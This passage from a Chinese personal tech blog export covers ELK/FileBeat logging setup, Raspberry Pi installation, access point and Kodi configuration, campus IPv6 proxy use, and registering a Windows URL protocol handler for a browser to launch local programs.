alt=\"\"></p>\n<p>最后启动Beat。这里Beat使用FileBeat，配置FileBeat。需要将<code>filebeat.inputs.enable</code>设为<code>true</code>，向<code>filebeat.inputs.paths</code>中配置监听的日志目录。<br><figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">filebeat.inputs:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">type:</span> <span class=\"string\">log</span></span><br><span class=\"line\">  <span class=\"comment\"># Change to true to enable this input configuration.</span></span><br><span class=\"line\">  <span class=\"attr\">enabled:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"comment\"># Paths that should be crawled and fetched. Glob based paths.</span></span><br><span class=\"line\">  <span class=\"attr\">paths:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">/logs/1.log</span></span><br><span class=\"line\">    <span class=\"comment\">#- c:\\programdata\\elasticsearch\\logs\\*</span></span><br></pre></td></tr></table></figure><br>由于此处采用Beat向Logstash传递日志的架构，注解掉ElasticSearch的设置，配置输出为Logstash：<br><figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -------- Elasticsearch Output --------</span></span><br><span class=\"line\"><span class=\"comment\">#output.elasticsearch:</span></span><br><span class=\"line\">  <span class=\"comment\"># Array of hosts to connect to.</span></span><br><span class=\"line\">  <span class=\"comment\">#hosts: [&quot;localhost:9200&quot;]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\"># Protocol - either `http` (default) or `https`.</span></span><br><span class=\"line\">  <span class=\"comment\">#protocol: &quot;https&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\"># Authentication credentials - either API key or username/password.</span></span><br><span class=\"line\">  <span class=\"comment\">#api_key: &quot;id:api_key&quot;</span></span><br><span class=\"line\">  <span class=\"comment\">#username: &quot;elastic&quot;</span></span><br><span class=\"line\">  <span class=\"comment\">#password: &quot;changeme&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ------- Logstash Output --------</span></span><br><span class=\"line\"><span class=\"attr\">output.logstash:</span></span><br><span class=\"line\">  <span class=\"comment\"># The Logstash hosts</span></span><br><span class=\"line\">  <span class=\"attr\">hosts:</span> [<span class=\"string\">&quot;localhost:5044&quot;</span>]</span><br></pre></td></tr></table></figure></p>\n<p>启动Beat：<code>filebeat -e -c filebeat.yml</code>，向<code>1.log</code>写入两行日志：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">thankod_24_student</span><br><span class=\"line\">xuranus_24_student</span><br></pre></td></tr></table></figure><br>浏览器输入<a href=\"http://localhost:5601/app/discover\">http://localhost:5601/app/discover</a>进入Kibana的Web页面，Discover中可以使用KQL搜索检索到这两条记录了：<br><img src=\"4.png\" alt=\"\"></p>\n<p><img src=\"5.png\" alt=\"\"></p>\n<h2 id=\"其他的日志处理架构\"><a href=\"#其他的日志处理架构\" class=\"headerlink\" title=\"其他的日志处理架构\"></a>其他的日志处理架构</h2><p>本处的日志采集与离线存储架构使用FileBeat -&gt; Logstash -&gt; ElasticSearch，除了这种架构也可以使用FLume -&gt; Kafka -&gt; Hadoop。kafka的分布式缓存功能可以在数据量特别大的时候缓冲数据，防止丢失。</p>\n<p>日志数据除了离线存储之外还有在线流式分析，从Kafka传出的数据可以交给：</p>\n<ul>\n<li>Storm</li>\n<li>Spark Streaming</li>\n<li>Flink<br>之后可以进行一些实时分析，如推荐系统。</li>\n</ul>\n<blockquote>\n<p>技术选型需要考虑实际业务量，QPS不高的业务完全可以用轻量级工具</p>\n<p>参考资料：</p>\n<ul>\n<li><a href=\"https://www.cnblogs.com/aresxin/p/8035137.html\">ELK原理和介绍</a></li>\n<li><a href=\"https://www.cnblogs.com/zsql/p/13164414.html\">https://www.cnblogs.com/zsql/p/13164414.html</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/121099453\">https://zhuanlan.zhihu.com/p/121099453</a></li>\n</ul>\n</blockquote>\n","tags":["日志"]},{"title":"树莓派3B+安装Raspbian","url":"/2019/05/15/%E6%A0%91%E8%8E%93%E6%B4%BE3B-%E5%AE%89%E8%A3%85Raspbian/","content":"<p>由于树莓派3B+至今为止官方没有发布可用的第三方镜像，经测试只有Noob和raspbian可以直接使用。</p>\n<p>环境：ArchLinux</p>\n<h2 id=\"刻录\"><a href=\"#刻录\" class=\"headerlink\" title=\"刻录\"></a>刻录</h2><ul>\n<li>首先去官网下载raspbian镜像:<a href=\"https://www.raspberrypi.com/software/\">下载连接</a></li>\n<li>准备一张SD卡，<code>lsblk</code>(假设盘符是<code>/dev/sdc</code>)。</li>\n<li>插入并格式化<code>sudo wipefs --all /dev/sdc</code></li>\n<li><del>解压下载的文件 <code>unzip 2019-04-09-raspbian-jessie-lite.zip</code></del></li>\n<li><del>刻录 <code>sudo dd bs=4M if=2019-04-09-raspbian-jessie-lite.img of=/dev/sdc</code> ,需要等待几分钟</del></li>\n<li>~<code>sync</code> 确保缓存写入~~<span id=\"more\"></span>\n</li>\n</ul>\n<blockquote>\n<p>2022.04，最新的Raspberry Pi OS出于安全原因删除了默认的<code>pi</code>用户。用户需要在界面上首次登录创建用户，或者使用官方的<code>rpi-imager</code>工具在烧录前设置用户。</p>\n</blockquote>\n<p><img src=\"Screenshot_20220618_151846.png\" alt=\"\"></p>\n<h2 id=\"开启SSH\"><a href=\"#开启SSH\" class=\"headerlink\" title=\"开启SSH\"></a>开启SSH</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mkdir boot</span><br><span class=\"line\">sudo mount /dev/sdc1 boot</span><br><span class=\"line\">sudo touch boot/ssh</span><br><span class=\"line\">sudo umount /dev/sdc1</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>2022.04，推荐用<code>rpi-imager</code>开启SSH并设置用户名密码</p>\n</blockquote>\n<h2 id=\"开启Wifi\"><a href=\"#开启Wifi\" class=\"headerlink\" title=\"开启Wifi\"></a>开启Wifi</h2><p>如果没有屏幕，需要让树莓派和电脑在同一局域网下，如果网线也没有，可以用手机开热点</p>\n<ul>\n<li>挂载主分区<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mkdir mount</span><br><span class=\"line\">sudo mount /dev/sdc2 mount</span><br></pre></td></tr></table></figure></li>\n<li>修改<code>/etc/wpa_supplicant/wpa_supplicant.conf</code><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cd mount</span><br><span class=\"line\">sudo vim etc/wpa_supplicant/wpa_supplicant.conf</span><br></pre></td></tr></table></figure>\n内容如下<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev</span><br><span class=\"line\">update_config=1</span><br><span class=\"line\">country=CN</span><br><span class=\"line\"></span><br><span class=\"line\">network=&#123;</span><br><span class=\"line\">  ssid=&quot;raspberry&quot;</span><br><span class=\"line\">  psk=&quot;12345678&quot;</span><br><span class=\"line\">  key_mgmt=WPA-PSK</span><br><span class=\"line\">  priority=1</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure></li>\n<li>取消挂载<br><code>sudo umount /dev/sdc2</code></li>\n</ul>\n<blockquote>\n<p>2022.04，推荐用<code>rpi-imager</code>配置WiFi</p>\n</blockquote>\n<h2 id=\"SSH连接\"><a href=\"#SSH连接\" class=\"headerlink\" title=\"SSH连接\"></a>SSH连接</h2><p>插卡通电，开机，电脑连接热点， <code>ifconfig</code><br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">wlp2s0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class=\"line\">        inet 118.202.10.164  netmask 255.255.255.0  broadcast 118.202.10.255</span><br><span class=\"line\">        inet6 fe80::d1c8:5b0f:1908:7453  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class=\"line\">        inet6 2001:da8:9000:a802:b2cf:bfce:7322:5459  prefixlen 64  scopeid 0x0&lt;global&gt;</span><br><span class=\"line\">        ether d4:25:8b:df:47:c9  txqueuelen 1000  (Ethernet)</span><br><span class=\"line\">        RX packets 432925  bytes 580148861 (553.2 MiB)</span><br><span class=\"line\">        RX errors 0  dropped 3  overruns 0  frame 0</span><br><span class=\"line\">        TX packets 226946  bytes 26680755 (25.4 MiB)</span><br><span class=\"line\">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure></p>\n<p><code>nmap 118.202.10.164/24</code> 扫描局域网内主机</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Nmap scan report for IP-118-202-10-166(118.202.10.166)</span><br><span class=\"line\">Host is up (0.011s latency).</span><br><span class=\"line\">Not shown: 997 closed ports</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">22/tcp open  ssh</span><br></pre></td></tr></table></figure>\n<p><del><code>ssh pi@118.202.10.166</code> 连接，初始密码 <code>raspberry</code></del></p>\n<h2 id=\"基础配置\"><a href=\"#基础配置\" class=\"headerlink\" title=\"基础配置\"></a>基础配置</h2><p>进入配置界面：<code>sudo raspi-config</code>,修改密码，语言环境，时区，<code>sudo reboot</code></p>\n<ul>\n<li>设置root密码：<code>sudo passwd root</code></li>\n<li>解锁root账户：<code>sudo passwd --unlock root</code></li>\n<li>换用清华源：<code>sudo vim /etc/apt/sources.list</code><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#deb http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ jessie main non-free contrib  </span></span><br><span class=\"line\"><span class=\"comment\">#deb-src http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ jessie main non-free contrib  </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Latest</span></span><br><span class=\"line\">deb http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ bullseye main non-free contrib  </span><br><span class=\"line\">deb-src http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ bullseye main non-free contrib  </span><br></pre></td></tr></table></figure></li>\n<li>更新软件源列表：<code>sudo apt-get update</code></li>\n<li>更新系统：<code>sudo apt-get upgrade</code></li>\n</ul>\n","tags":["树莓派"]},{"title":"树莓派开启无线AP","url":"/2018/10/08/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%BC%80%E5%90%AF%E6%97%A0%E7%BA%BFAP/","content":"<blockquote>\n<p>2022.6 本文对于现在的Raspberry Pi OS已经不适用，移步<a href=\"https://www.raspberrypi.com/documentation/computers/configuration.html#before-you-begin\">官方文档</a></p>\n<p>之前尝试了树莓派用作无限AP的教程，大多都只能获得ipv4地址，本文参考一篇教程，可以让树莓派给接入设备分配ipv6地址</p>\n</blockquote>\n<p>原文链接：<a href=\"https://thepi.io/how-to-use-your-raspberry-pi-as-a-wireless-access-point/\">How to use your Raspberry Pi as a wireless access point</a></p>\n<p>环境：原生Raspbian</p>\n<h3 id=\"安装和更新Raspbian\"><a href=\"#安装和更新Raspbian\" class=\"headerlink\" title=\"安装和更新Raspbian\"></a>安装和更新Raspbian</h3><p>因为<code>hostapd</code>和<code>dnsmasq</code>对依赖的版本要求很高，需要先更新系统：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get upgrade</span><br></pre></td></tr></table></figure><br>更新后可能依然提示依赖版本过低，所以最好先<code>sudo reboot</code><br><span id=\"more\"></span></p>\n<h3 id=\"安装dnsmasq和hostapd\"><a href=\"#安装dnsmasq和hostapd\" class=\"headerlink\" title=\"安装dnsmasq和hostapd\"></a>安装dnsmasq和hostapd</h3><p>之后就可以开始安装<code>dnsmasq</code>和<code>hostapd</code>：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get install hostapd dnsmasq</span><br></pre></td></tr></table></figure><br><code>hostapd</code>是用来创建无线热点，<code>dnsmasq</code>则是用来配置DNS和DHCP服务器，先将两个服务关闭：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo systemctl stop hostapd</span><br><span class=\"line\">sudo systemctl stop dnsmasq</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"给wlan0配置静态ip\"><a href=\"#给wlan0配置静态ip\" class=\"headerlink\" title=\"给wlan0配置静态ip\"></a>给wlan0配置静态ip</h3><p>之后修改菜配置：<code>sudo vim /etc/dhcpcd.conf</code>，在文件末尾加入以下行：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">interface wlan0</span><br><span class=\"line\">static ip_address=192.168.0.10/24</span><br><span class=\"line\">denyinterfaces eth0</span><br><span class=\"line\">denyinterfaces wlan0</span><br></pre></td></tr></table></figure><br>其中<strong>192.168.0.10</strong>是配置的静态ip,/24说明子网掩码是255.255.255.0</p>\n<h3 id=\"配置DHCP服务器\"><a href=\"#配置DHCP服务器\" class=\"headerlink\" title=\"配置DHCP服务器\"></a>配置DHCP服务器</h3><p>先备份原先配置：<code>sudo mv /etc/dnsmasq.conf /etc/dnsmasq.conf.orig</code>，然后修改：<code>sudo vim /etc/dnsmasq.conf</code><br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">interface=wlan0</span><br><span class=\"line\">  dhcp-range=192.168.0.11,192.168.0.30,255.255.255.0,24h</span><br></pre></td></tr></table></figure><br>上述配置为wlan0的dhcp区间</p>\n<h3 id=\"配置hostapd\"><a href=\"#配置hostapd\" class=\"headerlink\" title=\"配置hostapd\"></a>配置hostapd</h3><p><code>sudo vim /etc/hostapd/hostapd.conf</code>，修改内容呢类似下面<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">interface=wlan0</span><br><span class=\"line\">bridge=br0</span><br><span class=\"line\">hw_mode=g</span><br><span class=\"line\">channel=7</span><br><span class=\"line\">wmm_enabled=0</span><br><span class=\"line\">macaddr_acl=0</span><br><span class=\"line\">auth_algs=1</span><br><span class=\"line\">ignore_broadcast_ssid=0</span><br><span class=\"line\">wpa=2</span><br><span class=\"line\">wpa_key_mgmt=WPA-PSK</span><br><span class=\"line\">wpa_pairwise=TKIP</span><br><span class=\"line\">rsn_pairwise=CCMP</span><br><span class=\"line\">ssid=NETWORK</span><br><span class=\"line\">wpa_passphrase=PASSWORD</span><br></pre></td></tr></table></figure><br>其中:<strong>NETWORK</strong>是SSID的名称，<strong>wpa_passphrase</strong>是密码，加密为WPA-PSK</p>\n<p>然后<code>sudo vim /etc/default/hostapd</code>，将<code>DAEMON_CONF=&quot;&quot;</code>取消注释，改为：<code>DAEMON_CONF=&quot;/etc/hostapd/hostapd.conf&quot;</code></p>\n<h3 id=\"配置数据转发和iptable\"><a href=\"#配置数据转发和iptable\" class=\"headerlink\" title=\"配置数据转发和iptable\"></a>配置数据转发和iptable</h3><p>执行<code>sudo vim /etc/sysctl.conf</code>，取消<code>net.ipv4.ip_forward=1</code>的注释</p>\n<p>配置转发规则：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class=\"line\">sudo sh -c &quot;iptables-save &gt; /etc/iptables.ipv4.nat&quot;</span><br></pre></td></tr></table></figure></p>\n<p>在启动项<code>/etc/rc.local</code>中的<code>exit 0</code>之前加入一行：<code>iptables-restore &lt; /etc/iptables.ipv4.nat</code></p>\n<h3 id=\"开启网络连接\"><a href=\"#开启网络连接\" class=\"headerlink\" title=\"开启网络连接\"></a>开启网络连接</h3><p>现在树梅派已经可以作为热点但不能接入网络，我们需要在eth0和wlan0之间建一个网桥接口</p>\n<p>首先安装：<code>sudo apt-get install bridge-utils</code>，然后建立一个网桥，名为br0:<code>sudo brctl addbr br0</code>，将eth0连到网桥上：<code>sudo brctl addif br0 eth0</code>，配置接口信息：<code>sudo nano /etc/network/interfaces</code>，在末尾加上下面几行：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">auto br0</span><br><span class=\"line\">iface br0 inet manual</span><br><span class=\"line\">bridge_ports eth0 wlan0</span><br></pre></td></tr></table></figure><br>最后，设置开机自启动:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo systemctl enable dnsmasq</span><br><span class=\"line\">sudo systemctl enable hostapd</span><br></pre></td></tr></table></figure><br>最后重启：<code>sudo reboot</code>，连接热点，输入<code>ifconfig</code>已经有ipv6地址了。</p>\n","tags":["树莓派"]},{"title":"树莓派搭建Kodi机顶盒","url":"/2022/01/22/%E6%A0%91%E8%8E%93%E6%B4%BE%E6%90%AD%E5%BB%BAKodi%E6%9C%BA%E9%A1%B6%E7%9B%92/","content":"<blockquote>\n<p>老家的机顶盒到期了，但其低劣的画质和残缺的功能放在2022年实在难以让我为其续费，正好家里装了无线网，打算用闲置的树莓派3B+顶替一下电视盒子</p>\n</blockquote>\n<p>树莓派作为家庭影音系统的最佳解决方案是Kodi，可以通过刷入LibreELEC系统来使用Kodi。</p>\n<p>LibreELEC简单来说就是最小限度满足Kodi运行的Linux，LibreELEC是把精简版Linux与kodi集成的媒体中心系统，速度快，cpu占用率低，非常适合性能较差的主机。</p>\n<span id=\"more\"></span>\n<h2 id=\"烧录系统盘\"><a href=\"#烧录系统盘\" class=\"headerlink\" title=\"烧录系统盘\"></a>烧录系统盘</h2><p>先去<a href=\"https://libreelec.tv/downloads/\">LibreELEC官网</a>下载LibreELEC USB-SD Creator，用于将LibreELEC烧录进SD卡。</p>\n<blockquote>\n<p>尝试过手动下载镜像后用<code>dd</code>命令和Etcher，但是烧录过程会出问题，建议用官方烧录工具。</p>\n</blockquote>\n<p><img src=\"Screenshot_20220122_085115.png\" alt=\"\"></p>\n<p>我的树莓派是3B+，armv7处理器，这里可以选择<code>Rasberry Pi 4 and 400</code>。</p>\n<blockquote>\n<p>如果选择<code>Raspberry Pi 2 and 3</code>那么下载的LibreELEC 9包含的Kodi版本会是18（Leia），Leia的Repository很多已经停止维护了，所以这里最好是用搭载了Kodi 19（Matrix）的LibreELEC 10。</p>\n</blockquote>\n<p>烧录完成后直接将SD卡插入树莓派，启动即可进入系统。先配置WiFi，然后按照提示开启SSH和Samba。</p>\n<p><img src=\"20211246249764061.jpg\" alt=\"\"></p>\n<p>除了需要一个显示器，还需要一个控制设备，可以是鼠标，键盘，或是一个免驱的2.4G遥控器（某宝大约20一个）</p>\n<h2 id=\"设置中文\"><a href=\"#设置中文\" class=\"headerlink\" title=\"设置中文\"></a>设置中文</h2><p>完成配置后首先设置中文，依次进入<code>Setting</code>，<code>Interface</code>，<code>Skin</code>，<code>Fonts</code>，<code>Skin</code>，将<code>default</code>改为<code>Arial based</code>。</p>\n<blockquote>\n<p>这一步必须先完成，不然后续操作会乱码</p>\n</blockquote>\n<p>在主界面<code>Add on</code>中使用<code>Search</code>搜索<code>Chinese</code>中文语言插件，安装后切换成中文。</p>\n<h2 id=\"Web管理界面\"><a href=\"#Web管理界面\" class=\"headerlink\" title=\"Web管理界面\"></a>Web管理界面</h2><p>在<code>设置</code>中可以开启Web管理界面，然后访问<code>树莓派IP:8080</code>即可使用Web界面控制。</p>\n<h2 id=\"UPnP-DLNA\"><a href=\"#UPnP-DLNA\" class=\"headerlink\" title=\"UPnP/DLNA\"></a>UPnP/DLNA</h2><p>进入<code>设置</code>，<code>服务</code>，<code>UPnP/DLNA</code>，启动<code>UPnP</code>支持。开启后在手机上用爱奇艺，腾讯视频，Bilibili等APP可以搜索到Kodi盒子进行投屏。</p>\n<p><img src=\"Screenshot_20220123_095833.png\" alt=\"\"></p>\n<h2 id=\"IPTV\"><a href=\"#IPTV\" class=\"headerlink\" title=\"IPTV\"></a>IPTV</h2><p>安装Kodi上的IPTV客户端，这里推荐<strong>PVR IPTV Simple Client</strong>，在<code>插件</code>里搜索它安装即可。<strong>注意Kodi 19（Matrix）支持的PVR IPTV Simple Client版本已经大于19，安装最新的版本。</strong></p>\n<p><img src=\"3.png\" alt=\"\"></p>\n<p>去GitHub上找一个电视直播<code>*.m3u</code>源文件，用SMB上传到Kodi的<code>storage/Downloads</code>文件夹，在<code>插件</code>设置中配置<code>*.m3u</code>文件地址。重启系统即可用IPTV播放电视节目了。</p>\n<blockquote>\n<p>亲测树莓派3B+播放本地4K视频流畅。如果是播放IPTV，建议用千兆网接口。</p>\n</blockquote>\n<p>除了PVR IPTV Simple Client，还推荐以下插件：</p>\n<ul>\n<li>Twitch（不知为何它在Kodi上没被墙）</li>\n<li>TED</li>\n<li>YouTube（需要在Kodi中设置代理）</li>\n<li>Radio（收听全世界广播）</li>\n</ul>\n<h2 id=\"代理\"><a href=\"#代理\" class=\"headerlink\" title=\"代理\"></a>代理</h2><p>Kodi上很多功能（YouTube，Netflix，GoogleDrive，etc.）在墙国用起来很麻烦，需要在内网单独配置一台Socks5/HTTP代理服务器，为了使用方便，我想将代理移到树莓派本地。</p>\n<p>我常用的是trojan代理，他可以在本地开启一个socks5代理服务，也就需要在树莓派本地允许trojan。</p>\n<p>我先下载了<a href=\"https://github.com/trojan-gfw/trojan\">trojan官方Repo</a>，然后在树莓派Ubuntu20.04上编译了trojan可执行程序，通过SSH移植到LibreELEC上，然后<code>./trojan</code>，结果提示：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sh: ./trojan: not found</span><br></pre></td></tr></table></figure><br>我在本地<code>file trojan</code>:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/home/xuranus/Desktop/trojan: ELF 64-bit LSB pie executable, ARM aarch64, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, BuildID[sha1]=f2f9a28b495bee82b05178c73cdc82bfa28cc553, for GNU/Linux 3.7.0, not stripped</span><br></pre></td></tr></table></figure><br>发现ubuntu20.04编译后的trojan的<code>interpreter</code>是<code>/lib/ld-linux-aarch64.so.1</code>，而libreELEC下缺少它。因为libreELEC是busybox构造的只读系统，没法修改<code>/lib</code>，所以这种方法行不通。</p>\n<p>偶然发现按LibreELEC居然支持Docker插件，安装Docker Add-ons后，再次SSH，已经可以使用Docker了。在Docker HUB上找了个arm的trojan镜像<a href=\"https://registry.hub.docker.com/r/teddysun/trojan\">teddysun/trojan</a>。将trojan配置文件放在<code>/storage/proxy/config.json</code>，运行容器即可：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -d --network host --name trojan-go --restart=always -v /storage/proxy:/etc/trojan-go teddysun/trojan-go</span><br></pre></td></tr></table></figure>\n<p>用<code>docker container ls</code>查看状态：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">10624f7d78fe        teddysun/trojan-go   &quot;/usr/bin/trojan-go …&quot;   2 minutes ago      Up 2 minutes                            trojan-go</span><br></pre></td></tr></table></figure><br>说明trojan已经跑起来了。</p>\n<p>最后回到libreELEC设置，将代理配置改为<code>127.0.0.1:1080</code>（trojan容器本地占用1080），这时已经可以使用YouTube了。</p>\n","tags":["树莓派"]},{"title":"校园网下的ipv6代理","url":"/2019/06/09/%E6%A0%A1%E5%9B%AD%E7%BD%91%E4%B8%8B%E7%9A%84ipv6%E4%BB%A3%E7%90%86/","content":"<p>本人坐标东北某三本985，最近赶上学校网络系统大换代，于是帐号就被恶意盗用了，月初60G的流量就给我用掉了70G……这两年网速越来越快，视频画质越来越好，动辄看个直播就是几个G，25快60G是真的不够用的，每个月流量费超出得几十甚至上百。加之这次帐号盗用事件，我便确定了不再用校园网。但奈何隔壁联通的CNC PPPoE太不安全，还卡，还dns污染，于是我又想起了ipv6代理。</p>\n<p>目前，教育网基本你已经覆盖ipv6，在我们学校。ipv6的流量不计费，得益于这一点，某些能被解析v6地址的网站（google全家桶）是可以在教育网下使用的，但是国内的网站大部分不行。于是我们需要一个ipv6的shaodowsocks代理，找一台ipv6服务器。</p>\n<p>之前我玩vulter的时候，就搭过ipv6的梯子，但最短半天就被封，而且vulter时常抽风，10M最高的带宽，还顶着高ping，使用很不稳定，就弃了。最近我用google搜ss，居然无意搜到一个ipv6的shadowsocks帐号提供商：<a href=\"https://home.shadowsocks.ch/aff.php?aff=26899\">链接地址</a>。<br><span id=\"more\"></span></p>\n<p>资费是19澳元，人民币90元/年，无限流量，提供10个左右各地区的服务器。<br><img src=\"Screenshot_20190609_063332.png\" alt=\"\"><br>ss搭建过程很简单，到处都有不在赘述。linux下ss的代理方法上一篇文章也讲过。</p>\n<p>本想拿来解决这个月的流量被盗用的问题，没想到体验居然极好，远远出乎我的预料。最近的日本节点延迟稳定150ms。</p>\n<p>首先是百度云，百度云代理后下载速度居然能稳定在10m/s<br><img src=\"Screenshot_20190609_063941.png\" alt=\"\"></p>\n<p>虎牙，斗鱼直播也可以蓝光流畅，国外的twitch，youtube则更加流畅。开源社区少了dns污染，github秒开，平时google和stackoverflow依赖者可以考虑入手。有了这个基本可以不用考虑续费校园网。</p>\n<p>存在的缺点则是：</p>\n<ol>\n<li>QQ不能用，可能qq的是udp传输的原因，可能是socks5 udp的bug，也可能的qq的feature</li>\n<li>b站很卡，浏览器端真的束手无策，只能借助youtube寻找替代资源（很多up在youtube同步投稿）但b站客户端似乎有对海外ip的加速功能</li>\n<li>视频音频资源受限，腾讯，b站，网易云一些资源之后中国ip才能访问，但我没有这个问题，手机用腾讯王卡可以免流。</li>\n</ol>\n<p>平时用linux，一些命令行操作需要开代理，加个proxychains前缀之类的。windows可能要麻烦点，需要手动配置git之类工具的代理。</p>\n","tags":["科学上网"]},{"title":"浏览器如何唤起本地程序","url":"/2021/06/18/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%A6%82%E4%BD%95%E5%94%A4%E8%B5%B7%E6%9C%AC%E5%9C%B0%E7%A8%8B%E5%BA%8F/","content":"<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><p>之前遇到这样一个场景：某个Web项目，业务中需要上传特别大的文件(&gt;20G)以及特别多文件的文件夹(&gt;10,000个)。如果选用浏览器直接上传会遇到以下问题：</p>\n<ul>\n<li>离开页面上传中断</li>\n<li>出错后无法断点续传</li>\n<li>无法暂停任务</li>\n</ul>\n<p>一旦失败就需要重传，时间成本极高，浏览器直接上传的用户体验极差。这种场景就需要用到本地上传器：由前端唤起一个本地上传程序，将文件拷贝到远端的的SMB服务器中，本地程序通过HTTP接口同步上传状态。上传业务流程是这样的：</p>\n<p><img src=\"smb.png\" alt=\"\"><br><span id=\"more\"></span></p>\n<p>本人一个基于此思路的项目：<a href=\"https://github.com/XUranus/smb-uploader\">smb-uploader</a></p>\n<p>当本地程序启动后，可以启动一个本地HTTP服务和前端通信。但是第一次启动则需要浏览器主动唤起，曾经IE使用ActiveX空间可以调用本地程序，但也带来了安全性问题，而如今ActiveX已经被主流浏览器停止支持。浏览器唤起本地程序如今已有了统一的方案。</p>\n<h2 id=\"Windows\"><a href=\"#Windows\" class=\"headerlink\" title=\"Windows\"></a>Windows</h2><p>Windows下可以使用注册协议(Register Protocol)来实现浏览器唤起本地程序。注册协议是一种用于通过链接发送，接收和处理信息的方法，浏览器可以处理的常见协议包括http，https，ftp 和 mailto。为了实现查看通过特定协议发送的信息，这种协议必须注册在注册表中注册，常见的我们可以通过点击一个邮件地址调起第三方邮件客户端。协议被注册后，该网址就可以由指定的程序（浏览器或第三方查看器）进行处理。例如：<code>mailto://abc@http://xyz.com</code>。可以使用注册了协议 mailto 的邮件客户端新建一封收件人地址为 <code>abc@xyz.com</code> 的邮件。同理我们可以利用这种方式实现在浏览器中页面调起本地程序。</p>\n<p>先用Go写一个简单的窗体程序，他会将第二个命令行参数在消息框中展示：<br><figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> (</span><br><span class=\"line\">\t<span class=\"string\">&quot;github.com/lxn/walk&quot;</span></span><br><span class=\"line\">\t_ <span class=\"string\">&quot;github.com/lxn/walk/declarative&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;os&quot;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>  &#123;</span><br><span class=\"line\">\twalk.MsgBox(<span class=\"literal\">nil</span>, <span class=\"string\">&quot;Show&quot;</span>, os.Args[<span class=\"number\">1</span>], walk.MsgBoxUserIcon)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>编译后命名为<code>show.exe</code>，在<code>C:\\Program Files</code>下创建一个<code>ShowDemo</code>文件夹，将<code>show.exe</code>至于其中。接下来让浏览器通过URL唤起<code>C:\\Program Files\\ShowDemo\\show.exe</code>，需要在注册表中加入相应配置：</p>\n<p>创建注册表文件<code>setup.reg</code>并执行：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Windows Registry Editor Version 5.00</span><br><span class=\"line\"></span><br><span class=\"line\">[HKEY_CLASSES_ROOT\\Show]</span><br><span class=\"line\">@=&quot;URL:Show Protocol Handler&quot;</span><br><span class=\"line\">&quot;URL Protocol&quot;=&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">[HKEY_CLASSES_ROOT\\Show\\shell]</span><br><span class=\"line\"></span><br><span 